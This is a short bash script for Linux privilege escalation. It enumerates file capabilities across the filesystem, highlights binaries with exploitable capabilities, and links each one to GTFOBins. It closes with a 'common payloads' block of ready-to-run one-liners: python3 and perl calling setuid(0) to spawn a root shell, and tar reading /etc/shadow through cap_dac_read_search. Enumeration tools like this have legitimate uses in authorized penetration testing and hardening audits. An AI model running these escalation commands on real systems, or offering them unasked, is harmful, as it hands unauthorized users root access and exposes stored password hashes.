#!/usr/bin/env bash
# capabilities-enum.sh — Linux capabilities on files + exploit hints.
set -u

EXPLOIT='cap_setuid|cap_setgid|cap_dac_read_search|cap_dac_override|cap_sys_admin|cap_sys_ptrace|cap_sys_module|cap_chown|cap_fowner|cap_net_raw|cap_net_admin|cap_net_bind_service|cap_audit_write|cap_kill|cap_sys_chroot|cap_sys_rawio|cap_sys_resource|cap_sys_boot'

if ! command -v getcap >/dev/null; then
    echo "getcap not installed — install libcap2-bin (Debian) or libcap (RHEL)"; exit 1
fi

echo "=== File capabilities (filesystem-wide) ==="
getcap -r / 2>/dev/null | sort -u | while read -r line; do
    if echo "$line" | grep -qE "$EXPLOIT"; then
        printf "\033[1;32m[+]\033[0m %s\n" "$line"
        BIN=$(echo "$line" | awk '{print $1}')
        BASE=$(basename "$BIN")
        echo "    -> see https://gtfobins.github.io/gtfobins/$BASE/#capabilities"
    else
        echo "    $line"
    fi
done

echo
echo "=== Current process capabilities ==="
[ -r /proc/self/status ] && grep ^Cap /proc/self/status

echo
echo "Hint — common payloads:"
cat <<'EOF'
  python3 with cap_setuid+ep:  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  perl    with cap_setuid+ep:  perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
  tar     with cap_dac_read_search:  tar -cvf /tmp/s.tar /etc/shadow ; tar -xf /tmp/s.tar -C /tmp
  ping    with cap_net_raw (info only — not privesc directly)
EOF
